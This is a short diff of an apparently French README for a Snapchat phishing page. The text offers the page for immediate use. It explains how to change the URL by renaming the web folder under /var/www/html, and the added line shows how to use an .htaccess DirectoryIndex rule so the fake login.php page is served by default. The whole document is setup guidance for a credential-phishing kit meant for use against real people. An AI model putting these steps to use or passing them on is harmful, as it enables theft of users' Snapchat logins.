@@ -6,4 +6,6 @@ J'ai créé une page de phishing pour snapchat vous pouvez l'utiliser dès maint
 
 Vous pouvez changer le 'snapchat' dans votre url en modifiant le nom du dossier snapchat situé dans /var/www/html/snapchat
 
+<h2>VOUS POUVEZ AUSSI AJOUTER UN FICHIER .htaccess et rajouter dans le fichier cette ligne : <span>DirectoryIndex /snapchat/login.php</span>
+
 Hope you enjoy it !
